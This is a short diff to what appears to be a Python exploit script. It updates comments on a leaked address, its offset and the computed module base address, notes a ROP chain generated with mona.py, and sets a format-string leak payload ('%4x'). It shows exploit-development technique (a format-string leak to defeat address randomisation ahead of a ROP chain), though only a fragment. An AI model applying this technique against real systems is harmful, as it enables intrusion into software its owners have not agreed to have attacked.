@@ -5,9 +5,9 @@ import sys
 import time
 import struct
 
-# relative displacement is 20a0
-# leak address is 436b20a0
-# base address is 0x436b20a0 - 0x20a0 = 436b0000
+# relative displacement is 0x43b8
+# leak address is 0x436b43b8
+# base address is 0x436b43b8 - 0x43b8 = 436b0000
 # rop chain generated with mona.py - www.corelan.be
 
 leak_me="%4x"
